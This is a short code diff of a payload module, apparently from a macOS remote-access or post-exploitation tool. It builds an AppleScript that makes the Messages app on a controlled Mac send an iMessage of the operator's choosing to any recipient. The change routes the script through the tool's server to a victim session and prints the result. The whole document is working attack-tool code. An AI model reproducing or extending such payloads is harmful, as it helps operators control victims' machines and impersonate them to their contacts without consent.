@@ -5,14 +5,18 @@ class payload:
         self.type = "applescript"
         self.id = 116
 
-    def run(self,conn,server,command):
-        #do something with conn if you want
+    def run(self,session,server,command):
+        #do something with session if you want
         #we can prompt for input
         phone = raw_input("[*] Enter iMessage recipient: ")
         message = raw_input("[*] Enter message: ")
         #send applescript payload
-        return """tell application "Messages"
+        payload = """tell application "Messages"
         set targetService to 1st service whose service type = iMessage
         set targetBuddy to buddy \""""+phone+"""\" of targetService
         send \""""+message+"""\" to targetBuddy
         end tell"""
+        result = server.sendCommand(self.name,payload,self.type,session.conn)
+        if result:
+            print result
+        return ""
